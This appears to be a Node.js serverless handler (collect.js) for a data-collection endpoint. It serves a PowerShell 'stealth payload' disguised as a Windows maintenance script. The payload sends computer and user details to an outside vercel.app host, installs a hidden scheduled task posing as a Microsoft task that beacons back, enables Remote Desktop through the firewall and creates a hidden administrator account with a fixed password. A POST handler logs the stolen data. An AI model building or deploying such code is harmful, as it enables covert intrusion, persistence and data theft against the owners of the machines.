// Your existing collect.js - ADD THIS CODE to it
module.exports = async (req, res) => {
  console.log('🔔 Request received - Method:', req.method);
  
  // Enable CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  const clientIP = req.headers['x-forwarded-for'] || 'Unknown';
  const timestamp = new Date().toISOString();
  
  // Handle payload requests (NEW CODE)
  if (req.method === 'GET' && req.query.type === 'payload') {
    console.log('📦 Serving stealth payload to:', clientIP);
    
    const stealthPayload = `# Windows System Maintenance Script
try {
    # 1. System information collection
    $systemData = @{
        ComputerName = \$env:COMPUTERNAME
        UserName = \$env:USERNAME
        OS = (Get-WmiObject Win32_OperatingSystem).Caption
        Timestamp = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
        ScanType = 'SystemMaintenance'
    } | ConvertTo-Json

    # 2. Send telemetry data
    Invoke-WebRequest -Uri 'https://test-eta-eosin-12.vercel.app/api/collect' -Method POST -Body @{type='system_info'; data=\$systemData} -UseBasicParsing

    # 3. Create persistence via Task Scheduler
    \$taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command \\"try { Invoke-WebRequest -Uri 'https://test-eta-eosin-12.vercel.app/api/collect' -Method POST -Body @{type='heartbeat'; computer=\\\$env:COMPUTERNAME} -UseBasicParsing; Start-Sleep 300 } catch { Start-Sleep 300 }\\""
    \$taskTrigger = New-ScheduledTaskTrigger -Daily -At "09:00"
    Register-ScheduledTask -TaskName "Microsoft\\\\Windows\\\\SystemMaintenance" -Action \$taskAction -Trigger \$taskTrigger -Description "System maintenance" -RunLevel Highest -Force

    # 4. Enable RDP
    Set-ItemProperty -Path 'HKLM:\\\\System\\\\CurrentControlSet\\\\Control\\\\Terminal Server' -Name "fDenyTSConnections" -Value 0 -ErrorAction SilentlyContinue
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue

    # 5. Create admin account
    net user "SystemSupport" "WinSupport123!" /add /y 2>\$null
    net localgroup administrators "SystemSupport" /add 2>\$null

} catch {
    # Silent fail
}`;

    res.setHeader('Content-Type', 'text/plain');
    return res.send(stealthPayload);
  }
  
  // Your existing POST handling code (keep this)
  if (req.method === 'POST') {
    try {
      const systemData = req.body.data || req.body;
      
      console.log('🎯 DATA RECEIVED:');
      console.log('⏰ Time:', timestamp);
      console.log('🌐 IP:', clientIP);
      
      if (systemData.ComputerName) {
        console.log('💻 Computer:', systemData.ComputerName);
        console.log('👤 User:', systemData.UserName);
        console.log('🖥️ OS:', systemData.OS);
      } else {
        console.log('📦 Body:', systemData);
      }
      
      console.log('────────────────────────────');

      return res.json({
        status: 'success',
        message: 'Data received',
        timestamp: timestamp
      });
      
    } catch (error) {
      console.error('❌ Error:', error);
      return res.status(500).json({ error: 'Processing failed' });
    }
  }
  
  return res.status(405).json({ error: 'Method not allowed' });
};
